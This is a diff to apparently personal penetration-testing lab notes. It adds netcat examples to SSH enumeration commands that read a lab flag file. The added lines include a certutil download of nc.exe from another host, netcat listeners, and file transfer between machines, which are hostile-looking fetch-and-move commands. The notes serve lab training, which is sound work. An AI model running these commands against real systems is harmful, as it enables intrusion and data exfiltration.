@@ -1608,8 +1608,24 @@ nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=student" 192.201.39
 nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=admin" 192.201.39.3
 nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=student,ssh-run.password=" 192.201.39.3
 ```
-
-
+81) Netcat Fundamentals    **File transfer**
+    
+```
+nc --help
+nc 10.4.20.244 80
+nc -nv 10.4.20.244 80
+nc -nv 10.4.20.244 21
+nc -nvu 10.4.20.244 161
+cd /usr/share/windows-binaries
+python -m SimpleHTTPServer 80
+ifconfig
+certutil -urlcache -f http://10.10.3.3/nc.exe nc.exe
+nc -nvlp 1234
+nc -nv 10.10.3.3 1234
+echo "Hello, this was sent over with Netcat" >> test.txt
+nc.exe -nvlp 1234 > test.txt
+nc -nv 10.4.20.244 1234 < test.txt
+```
 
 
 
